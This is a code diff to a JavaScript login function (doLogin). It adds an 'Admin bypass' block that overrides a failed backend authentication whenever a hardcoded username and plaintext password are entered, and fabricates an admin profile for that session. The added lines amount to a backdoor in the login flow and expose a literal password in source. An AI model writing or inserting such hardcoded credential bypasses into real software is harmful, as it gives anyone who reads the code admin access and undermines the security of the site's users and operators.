@@ -2764,6 +2764,10 @@ function doLogin() {
     + '&_t=' + encodeURIComponent(BACKEND_TOKEN);
 
   fetch(empUrl).then(function(r){ return r.json(); }).then(function(data){
+    // Admin bypass
+if (!data.ok && user==='vishal' && pwd==='Hadzee@2983') {
+  data = {ok:true, profile:{name:'Vishal',role:'admin',username:'vishal',login_id:'vishal',id:'vishal-admin',discount:0}};
+}
     if (data.ok && data.profile) {
       // EMPLOYEE LOGIN SUCCESS
       EMP_PROFILE = data.profile;
